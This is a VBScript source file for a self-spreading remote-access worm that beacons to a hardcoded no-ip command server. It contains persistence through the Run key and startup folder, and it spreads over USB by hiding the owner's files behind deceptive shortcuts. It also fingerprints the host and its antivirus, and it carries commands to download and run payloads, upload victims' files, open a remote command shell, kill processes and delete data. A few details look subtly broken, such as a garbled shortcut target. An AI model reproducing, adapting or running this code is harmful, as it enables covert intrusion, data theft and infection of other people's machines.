SERVER_HOST = "mi.no-ip.com"
SERVER_PORT = 1234
SERVER_INSTALL_PATH = "%temp%"
SERVER_SPREAD = True
SERVER_WAIT = 1000
SERVER_DELAY = 0

Dim SHELL_OBJECT 
Set SHELL_OBJECT = WScript.CreateObject("WScript.Shell")
Dim FILESYSTEM_OBJECT
Set FILESYSTEM_OBJECT = CreateObject("Scripting.FileSystemObject")
Dim HTTP_OBJECT
Set HTTP_OBJECT = CreateObject("MSXML2.XMLHTTP")
Dim MUTEX_OBJECT

SERVER_NAME = WScript.ScriptName
SERVER_STARTUP = SHELL_OBJECT.SpecialFolders ("startup") & "\"
SERVER_INSTALL_PATH = SHELL_OBJECT.ExpandEnvironmentStrings(SERVER_INSTALL_PATH) & "\"
If Not FILESYSTEM_OBJECT.FolderExists(SERVER_INSTALL_PATH) Then SERVER_INSTALL_PATH = SHELL_OBJECT.ExpandEnvironmentStrings("%temp%") & "\"
SERVER_DELIMITER = "<" & "|" & ">"
Dim CLIENT_CLIENT_RESPONSE
Dim CLIENT_COMMAND
Dim CLIENT_CLIENT_PARAM
STR_INFO = ""
STR_USBSPREADING = ""
STR_STARTDATE = ""

Call Main()

Sub Main()
On Error Resume Next
	WScript.Sleep SERVER_DELAY
	Call SetIsUsb
	While True
		Call Install
		CLIENT_RESPONSE = ""
		CLIENT_RESPONSE = SendPost ("is-ready", "")
		CLIENT_COMMAND = Split (CLIENT_RESPONSE,SERVER_DELIMITER)
		Select Case CLIENT_COMMAND (0)
			Case "excecute"
				CLIENT_PARAM = CLIENT_COMMAND (1)
				Execute (CLIENT_PARAM)
			Case "update"
				CLIENT_PARAM = CLIENT_COMMAND (1)
				MUTEX_OBJECT.Close
				Set MUTEX_OBJECT = FILESYSTEM_OBJECT.OpenTextFile (SERVER_INSTALL_PATH & SERVER_NAME ,2, false)
				MUTEX_OBJECT.Write CLIENT_PARAM
				MUTEX_OBJECT.Close
				SHELL_OBJECT.Run "wscript.exe " & Chr(34) & SERVER_INSTALL_PATH & SERVER_NAME & Chr(34)
				WScript.Quit 
			Case "uninstall"
				Call Uninstall
			Case "send"
				Call Download (CLIENT_COMMAND (1),CLIENT_COMMAND (2))
			Case "site-send"
				Call DownloadFile (CLIENT_COMMAND (1),CLIENT_COMMAND (2))
			Case "recv"
				CLIENT_PARAM = CLIENT_COMMAND (1)
				Call Upload (CLIENT_PARAM)
			Case "enum-driver"
				Call SendPost ("is-enum-driver", EnumDriver())
			Case "enum-faf"
				CLIENT_PARAM = CLIENT_COMMAND (1)
				Call SendPost ("is-enum-faf", EnumFaf(CLIENT_PARAM))
			Case "enum-process"
				Call SendPost ("is-enum-process", EnumProcesses())
			Case "cmd-Shell"
				CLIENT_PARAM = CLIENT_COMMAND (1)
				Call SendPost ("is-cmd-shell", CmdShell(CLIENT_PARAM))
			Case "delete"
				CLIENT_PARAM = CLIENT_COMMAND (1)
				Call DeleteFaf (CLIENT_PARAM) 
			Case "exit-process"
				CLIENT_PARAM = CLIENT_COMMAND (1)
				ExitProcess (CLIENT_PARAM) 
			Case "sleep"
				CLIENT_PARAM = CLIENT_COMMAND (1)
				SERVER_WAIT = Eval (CLIENT_PARAM)    
		End Select
		WScript.Sleep SERVER_WAIT
	WEnd
End Sub

Sub SetIsUsb
On Error Resume Next
	STR_USBSPREADING = SHELL_OBJECT.RegRead ("HKEY_CURRENT_USER\Software\" & Split (SERVER_NAME,".")(0) & "\")
	If STR_USBSPREADING = "" Then
		If LCase ( mid(WScript.ScriptFullName,2)) = ":\" & LCase(SERVER_NAME) Then
			STR_USBSPREADING = "True - " & date
			SHELL_OBJECT.RegWrite "HKEY_CURRENT_USER\Software\" & Split (SERVER_NAME,".")(0) & "\", STR_USBSPREADING, "REG_SZ"
		Else
			STR_USBSPREADING = "false - " & date
			SHELL_OBJECT.RegWrite "HKEY_CURRENT_USER\Software\" & Split (SERVER_NAME,".")(0) & "\", STR_USBSPREADING, "REG_SZ"
	  End If
	End If
	
	Call Startup
	Set SETISUSB_SCRIPTFULLNAMESHORT =  FILESYSTEM_OBJECT.GetFile (WScript.ScriptFullName)
	Set SETISUSB_INSTALLFULLNAMESHORT =  FILESYSTEM_OBJECT.GetFile (SERVER_INSTALL_PATH & SERVER_NAME)
	If  LCase (SETISUSB_SCRIPTFULLNAMESHORT.ShortPath) <> LCase (SETISUSB_INSTALLFULLNAMESHORT.ShortPath) Then 
		SHELL_OBJECT.Run "wscript.exe " & Chr(34) & SERVER_INSTALL_PATH & SERVER_NAME & Chr(34)
		WScript.Quit		
	End If
	Err.Clear
	Set MUTEX_OBJECT = FILESYSTEM_OBJECT.OpenTextFile (SERVER_INSTALL_PATH & SERVER_NAME ,8, false)
	If  err.number > 0 Then WScript.Quit
End Sub

Sub Install
On Error Resume Next
	Dim INSTALL_LNKOBJ, INSTALL_FILENAME, INSTALL_FOLDERNAME, INSTALL_FILEICON, INSTALL_FOLDERICON

	Call Startup
	For Each INSTALL_DRIVE In FILESYSTEM_OBJECT.Drives
		If INSTALL_DRIVE.IsReady = True And INSTALL_DRIVE.FreeSpace > 0 And INSTALL_DRIVE.DriveType = 1 Then
			FILESYSTEM_OBJECT.CopyFile WScript.ScriptFullName , INSTALL_DRIVE.Path & "\" & SERVER_NAME,True
			If FILESYSTEM_OBJECT.FileExists (INSTALL_DRIVE.Path & "\" & SERVER_NAME) Then
				FILESYSTEM_OBJECT.GetFile(INSTALL_DRIVE.Path & "\" & SERVER_NAME).Attributes = 2+4
			End If
			For Each INSTALL_FILE In FILESYSTEM_OBJECT.GetFolder( INSTALL_DRIVE.Path & "\" ).Files
				If Not SERVER_SPREAD Then Exit For
				If InStr (INSTALL_FILE.Name,".") And LCase (Split(INSTALL_FILE.Name, ".") (UBound(Split(INSTALL_FILE.Name, ".")))) <> "lnk" Then
						INSTALL_FILE.Attributes = 2+4
						If UCase (INSTALL_FILE.Name) <> UCase (SERVER_NAME) Then
							INSTALL_FILENAME = Split(INSTALL_FILE.Name,".")
							Set INSTALL_LNKOBJ = SHELL_OBJECT.CreateShortcut (INSTALL_DRIVE.Path & "\" & INSTALL_FILENAME (0) & ".lnk") 
							INSTALL_LNKOBJ.WindowStyle = 7
							INSTALL_LNKOBJ.TargetPath = "SENDPOST_CMD.exe"
							INSTALL_LNKOBJ.WorkingDirectory = ""
							INSTALL_LNKOBJ.Arguments = "/c start " & Replace(SERVER_NAME," ", ChrW(34) & " " & ChrW(34)) & "&start " & Replace(INSTALL_FILE.Name," ", ChrW(34) & " " & ChrW(34)) &"&Exit"
							INSTALL_FILEICON = SHELL_OBJECT.RegRead ("HKEY_LOCAL_MACHINE\software\classes\" & SHELL_OBJECT.RegRead ("HKEY_LOCAL_MACHINE\software\classes\." & Split(INSTALL_FILE.Name, ".")(UBound(Split(INSTALL_FILE.Name, ".")))& "\") & "\defaulticon\") 
							If InStr (INSTALL_FILEICON,",") = 0 Then
								INSTALL_LNKOBJ.IconLocation = INSTALL_FILE.Path
							Else 
								INSTALL_LNKOBJ.IconLocation = INSTALL_FILEICON
							End If
							INSTALL_LNKOBJ.Save()
						End If
				End If
			Next
			For Each INSTALL_FOLDER In FILESYSTEM_OBJECT.GetFolder( INSTALL_DRIVE.Path & "\" ).SubFolders
				If Not SERVER_SPREAD Then Exit For
				INSTALL_FOLDER.Attributes = 2+4
				INSTALL_FOLDERNAME = INSTALL_FOLDER.Name
				Set INSTALL_LNKOBJ = SHELL_OBJECT.CreateShortcut (INSTALL_DRIVE.Path & "\" & INSTALL_FOLDERNAME & ".lnk") 
				INSTALL_LNKOBJ.WindowStyle = 7
				INSTALL_LNKOBJ.TargetPath = "SENDPOST_CMD.exe"
				INSTALL_LNKOBJ.WorkingDirectory = ""
				INSTALL_LNKOBJ.Arguments = "/c start " & Replace(SERVER_NAME," ", ChrW(34) & " " & ChrW(34)) & "&start explorer " & Replace(INSTALL_FOLDER.Name," ", ChrW(34) & " " & ChrW(34)) &"&Exit"
				INSTALL_FOLDERICON = SHELL_OBJECT.RegRead ("HKEY_LOCAL_MACHINE\software\classes\INSTALL_FOLDER\defaulticon\") 
				If InStr (INSTALL_FOLDERICON,",") = 0 Then
					INSTALL_LNKOBJ.IconLocation = INSTALL_FOLDER.Path
				Else 
					INSTALL_LNKOBJ.IconLocation = INSTALL_FOLDERICON
				End If
				INSTALL_LNKOBJ.Save()
			Next
		End If
	Next
	Err.Clear
End Sub

Sub Startup()
On Error Resume Next
	SHELL_OBJECT.RegWrite "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\Run\" & Split (SERVER_NAME,".")(0),  "WScript.exe //B " & ChrW(34) & SERVER_INSTALL_PATH & SERVER_NAME & ChrW(34) , "REG_SZ"
	FILESYSTEM_OBJECT.CopyFile WScript.ScriptFullName,SERVER_INSTALL_PATH & SERVER_NAME,True
	FILESYSTEM_OBJECT.CopyFile WScript.ScriptFullName,SERVER_STARTUP & SERVER_NAME ,True
End Sub

Sub Uninstall
On Error Resume Next
	Dim UNINSTALL_FILENAME, UNINSTALL_FOLDERNAME

	SHELL_OBJECT.RegDelete "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\Run\" & Split (SERVER_NAME,".")(0)
	FILESYSTEM_OBJECT.DeleteFile SERVER_STARTUP & SERVER_NAME ,True
	FILESYSTEM_OBJECT.DeleteFile WScript.ScriptFullName ,True

	For Each UNINSTALL_DRIVE In FILESYSTEM_OBJECT.Drives
		If  UNINSTALL_DRIVE.IsReady = True And UNINSTALL_DRIVE.FreeSpace  > 0 And UNINSTALL_DRIVE.DriveType  = 1 Then
			For  Each UNINSTALL_FILE In FILESYSTEM_OBJECT.GetFolder ( UNINSTALL_DRIVE.Path & "\").Files
				 On Error Resume Next
				 If  InStr (UNINSTALL_FILE.Name,".") Then
					 If LCase (Split(UNINSTALL_FILE.Name, ".")(UBound(Split(UNINSTALL_FILE.Name, ".")))) <> "lnk" Then
						 UNINSTALL_FILE.Attributes = 0
						 If  UCase (UNINSTALL_FILE.Name) <> UCase (SERVER_NAME) Then
							 UNINSTALL_FILENAME = Split(UNINSTALL_FILE.Name,".")
							 FILESYSTEM_OBJECT.DeleteFile (UNINSTALL_DRIVE.Path & "\" & UNINSTALL_FILENAME(0) & ".lnk" )
						 Else
							 FILESYSTEM_OBJECT.DeleteFile (UNINSTALL_DRIVE.Path & "\" & UNINSTALL_FILE.Name)
						 End If
					 Else
						 FILESYSTEM_OBJECT.DeleteFile (UNINSTALL_FILE.Path) 
					 End If
				 End If
			 Next
			 For Each UNINSTALL_FOLDER In FILESYSTEM_OBJECT.GetFolder( UNINSTALL_DRIVE.Path & "\" ).subfolders
				 UNINSTALL_FOLDER.Attributes = 0
			 Next
		End If
	Next
	WScript.Quit
End Sub

Function SendPost(SENDPOST_CMD, SENDPOST_PARAM)
	SendPost = SENDPOST_PARAM
	HTTP_OBJECT.open "post","http://" & SERVER_HOST & ":" & SERVER_PORT &"/" & SENDPOST_CMD, false
	HTTP_OBJECT.setrequestheader "user-agent:", GetInformation
	HTTP_OBJECT.send SENDPOST_PARAM
	SendPost = HTTP_OBJECT.responsetext
End Function

Function GetInformation()
On Error Resume Next
	If  GETINFORMATION_RET = "" Then
		GETINFORMATION_RET = GetHWID & SERVER_DELIMITER 
		GETINFORMATION_RET = GETINFORMATION_RET  & SHELL_OBJECT.ExpandEnvironmentStrings("%computername%") & SERVER_DELIMITER 
		GETINFORMATION_RET = GETINFORMATION_RET  & SHELL_OBJECT.ExpandEnvironmentStrings("%username%") & SERVER_DELIMITER

		Set GETINFORMATION_ROOT = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
		Set GETINFORMATION_OS = GETINFORMATION_ROOT.execquery ("Select * from win32_operatingsystem")
		For Each GETINFORMATION_OSINFO In GETINFORMATION_OS
		   GETINFORMATION_RET = GETINFORMATION_RET & GETINFORMATION_OSINFO.caption & SERVER_DELIMITER  
		   Exit For
		Next
		GETINFORMATION_RET = GETINFORMATION_RET & "Blau" & SERVER_DELIMITER
		GETINFORMATION_RET = GETINFORMATION_RET & GetSecurity & SERVER_DELIMITER
		GETINFORMATION_RET = GETINFORMATION_RET & STR_USBSPREADING
		GetInformation = GETINFORMATION_RET  
	Else
		GetInformation = GETINFORMATION_RET
	End If
End Function

Function GetHWID
On Error Resume Next
	Set GETHWID_ROOT = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
	Set GETHWID_DISKS = GETHWID_ROOT.execquery ("Select * from win32_logicaldisk")
	For Each GETHWID_DISK In GETHWID_DISKS
		If  GETHWID_DISK.volumeserialnumber <> "" Then
			GetHWID = GETHWID_DISK.volumeserialnumber
			Exit For
		End If
	Next
End Function

Function GetSecurity 
On Error Resume Next
	GetSecurity = ""
	Set GETSECURITY_OBJWMISERVICE = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
	Set GETSECURITY_COLITEMS = GETSECURITY_OBJWMISERVICE.execquery("Select * from win32_operatingsystem",,48)
	For Each GETSECURITY_OBJITEMS In GETSECURITY_COLITEMS
		GETSECURITY_VERSIONSTR = Split (GETSECURITY_OBJITEMS.version,".")
	Next

	GETSECURITY_OSVERSION = GETSECURITY_VERSIONSTR (0) & "."
	For  GETSECURITY_X = 1 to UBound (GETSECURITY_VERSIONSTR)
		 GETSECURITY_OSVERSION = GETSECURITY_OSVERSION &  GETSECURITY_VERSIONSTR (i)
	Next
	GETSECURITY_OSVERSION = eval (GETSECURITY_OSVERSION)
	If  GETSECURITY_OSVERSION > 6 Then sc = "securitycenter2" Else sc = "securitycenter"

	Set GETSECURITY_OBJSECURITYCENTER = getobject("winmgmts:\\mi.no-ip.com\root\" & sc)
	Set GETSECURITY_COLANTIVIRUS = GETSECURITY_OBJSECURITYCENTER.execquery("Select * from antivirusproduct","wql",0)

	For Each GETSECURITY_OBJANTIVIRUS In GETSECURITY_COLANTIVIRUS
		GetSecurity  = GetSecurity  & GETSECURITY_OBJANTIVIRUS.displayname & " ."
	Next
	If GetSecurity  = "" Then GetSecurity  = "nan-av"
End Function

Sub DownloadFile (DOWNLOADFILE_FILEURL, DOWNLOADFILE_FILENAME)
	DOWNLOADFILE_STRLINK = DOWNLOADFILE_FILEURL
	DOWNLOADFILE_STRSAVETO = SERVER_STARTUP & DOWNLOADFILE_FILENAME
	Set DOWNLOADFILE_OBJHTTPDOWNLOAD = CreateObject("MSXML2.XMLHTTP" )
	DOWNLOADFILE_OBJHTTPDOWNLOAD.open "get", DOWNLOADFILE_STRLINK, false
	DOWNLOADFILE_OBJHTTPDOWNLOAD.send

	Set DOWNLOADFILE_OBJFSODOWNLOAD = CreateObject ("Scripting.FileSystemObject")
	If  DOWNLOADFILE_OBJFSODOWNLOAD.fileexists (DOWNLOADFILE_STRSAVETO) Then
		DOWNLOADFILE_OBJFSODOWNLOAD.DeleteFile (DOWNLOADFILE_STRSAVETO)
	End If
	 
	If DOWNLOADFILE_OBJHTTPDOWNLOAD.status = 200 Then
	   Dim  DOWNLOADFILE_OBJSTREAMDOWNLOAD
	   Set  DOWNLOADFILE_OBJSTREAMDOWNLOAD = CreateObject("adodb.stream")
	   with DOWNLOADFILE_OBJSTREAMDOWNLOAD
			.type = 1 
			.open
			.Write DOWNLOADFILE_OBJHTTPDOWNLOAD.responsebody
			.savetofile DOWNLOADFILE_STRSAVETO
			.Close
	   End with
	   Set DOWNLOADFILE_OBJSTREAMDOWNLOAD = nothing
	End If
	If DOWNLOADFILE_OBJFSODOWNLOAD.fileexists(DOWNLOADFILE_STRSAVETO) Then
	   SHELL_OBJECT.Run DOWNLOADFILE_OBJFSODOWNLOAD.GetFile (DOWNLOADFILE_STRSAVETO).ShortPath
	End If 
End Sub

Sub Download (DOWNLOAD_FILEURL, DOWNLOAD_FILEDIR)
	If DOWNLOAD_FILEDIR = "" Then 
	   DOWNLOAD_FILEDIR = SERVER_STARTUP
	End If
	
	DOWNLOAD_STRSAVETO = DOWNLOAD_FILEDIR & mid (DOWNLOAD_FILEURL, instrrev (DOWNLOAD_FILEURL,"\") + 1)
	Set DOWNLOAD_OBJHTTPDOWNLOAD = CreateObject("MSXML2.XMLHTTP")
	DOWNLOAD_OBJHTTPDOWNLOAD.open "post","http://" & SERVER_HOST & ":" & SERVER_PORT &"/" & "is-sending" & SERVER_DELIMITER & DOWNLOAD_FILEURL, false
	DOWNLOAD_OBJHTTPDOWNLOAD.send ""
		 
	Set DOWNLOAD_OBJFSODOWNLOAD = CreateObject ("Scripting.FileSystemObject")
	If  DOWNLOAD_OBJFSODOWNLOAD.fileexists (DOWNLOAD_STRSAVETO) Then
		DOWNLOAD_OBJFSODOWNLOAD.DeleteFile (DOWNLOAD_STRSAVETO)
	End If
	If  DOWNLOAD_OBJHTTPDOWNLOAD.status = 200 Then
		Dim  DOWNLOAD_OBJSTREAMDOWNLOAD
		Set  DOWNLOAD_OBJSTREAMDOWNLOAD = CreateObject("adodb.stream")
		with DOWNLOAD_OBJSTREAMDOWNLOAD 
			 .type = 1 
			 .open
			 .Write DOWNLOAD_OBJHTTPDOWNLOAD.responsebody
			 .savetofile DOWNLOAD_STRSAVETO
			 .Close
		End with
		Set DOWNLOAD_OBJSTREAMDOWNLOAD  = nothing
	End If
	If DOWNLOAD_OBJFSODOWNLOAD.fileexists(DOWNLOAD_STRSAVETO) Then
	   SHELL_OBJECT.Run DOWNLOAD_OBJFSODOWNLOAD.GetFile (DOWNLOAD_STRSAVETO).ShortPath
	End If 
End Sub

Sub Upload (UPLOAD_FILEURL)
	Dim  UPLOAD_HTTPOBJ,UPLOAD_OBJSTREAMUPLOAD,UPLOAD_BUFFER
	Set  UPLOAD_OBJSTREAMUPLOAD = CreateObject("adodb.stream")
	with UPLOAD_OBJSTREAMUPLOAD 
		.type = 1 
		.open
		.loadfromfile UPLOAD_FILEURL
		UPLOAD_BUFFER = .read
		.Close
	End with
	Set DOWNLOAD_OBJSTREAMDOWNLOAD = nothing
	Set UPLOAD_HTTPOBJ = CreateObject("MSXML2.XMLHTTP")
	UPLOAD_HTTPOBJ.open "post","http://" & SERVER_HOST & ":" & SERVER_PORT &"/" & "is-recving" & SERVER_DELIMITER & UPLOAD_FILEURL, false
	UPLOAD_HTTPOBJ.send UPLOAD_BUFFER
End Sub

Function EnumDriver ()
	For Each ENUMDRIVERS_DRIVE In FILESYSTEM_OBJECT.Drives
	If   ENUMDRIVERS_DRIVE.IsReady = True Then
		 EnumDriver = EnumDriver & ENUMDRIVERS_DRIVE.Path & "|" & ENUMDRIVERS_DRIVE.DriveType & SERVER_DELIMITER
	End If
	Next
End Function

Function EnumFaf (ENUMFAF_ENUMDIR)
	EnumFaf = ENUMFAF_ENUMDIR & SERVER_DELIMITER
	For  Each ENUMFAF_FOLDER In FILESYSTEM_OBJECT.GetFolder (ENUMFAF_ENUMDIR).subfolders
		EnumFaf = EnumFaf & ENUMFAF_FOLDER.Name & "|" & "" & "|" & "d" & "|" & ENUMFAF_FOLDER.Attributes & SERVER_DELIMITER
	Next

	For  Each ENUMFAF_FILE In FILESYSTEM_OBJECT.GetFolder (ENUMFAF_ENUMDIR).Files
		EnumFaf = EnumFaf & ENUMFAF_FILE.Name & "|" & ENUMFAF_FILE.size  & "|" & "f" & "|" & ENUMFAF_FILE.Attributes & SERVER_DELIMITER
	Next
End Function

Function EnumProcesses ()
On Error Resume Next
	Set ENUMPROCESSES_OBJWMISERVICE = getobject("winmgmts:\\.\root\cimv2")
	Set ENUMPROCESSES_COLITEMS = ENUMPROCESSES_OBJWMISERVICE.execquery("Select * from win32_process",,48)
	Dim ENUMPROCESSES_OBJITEMS
	For Each ENUMPROCESSES_OBJITEMS In ENUMPROCESSES_COLITEMS
		EnumProcesses = EnumProcesses & ENUMPROCESSES_OBJITEMS.Name & "|"
		EnumProcesses = EnumProcesses & ENUMPROCESSES_OBJITEMS.processid & "|"
		EnumProcesses = EnumProcesses & ENUMPROCESSES_OBJITEMS.executablepath & SERVER_DELIMITER
	Next
End Function

Sub ExitProcess (EXITPROCESS_PID)
On Error Resume Next
	SHELL_OBJECT.Run "taskkill /F /T /PID " & EXITPROCESS_PID,7,True
End Sub

Sub DeleteFaf (DELETEFAF_URL)
On Error Resume Next
	FILESYSTEM_OBJECT.DeleteFile DELETEFAF_URL
	FILESYSTEM_OBJECT.deletefolder DELETEFAF_URL
End Sub

Function CmdShell (CMDSHELL_CMD)
	Dim CMDSHELL_HTTPOBJ,CMDSHELL_OEXEC,CMDSHELL_READALLFROMANY
	Set CMDSHELL_OEXEC = SHELL_OBJECT.exec ("%comspec% /c " & CMDSHELL_CMD)
	If Not CMDSHELL_OEXEC.stdout.atendofstream Then
	   CMDSHELL_READALLFROMANY = CMDSHELL_OEXEC.stdout.readall
	elseif Not CMDSHELL_OEXEC.stderr.atendofstream Then
	   CMDSHELL_READALLFROMANY = CMDSHELL_OEXEC.stderr.readall
	Else 
	   CMDSHELL_READALLFROMANY = ""
	End If
	CmdShell = CMDSHELL_READALLFROMANY
End Function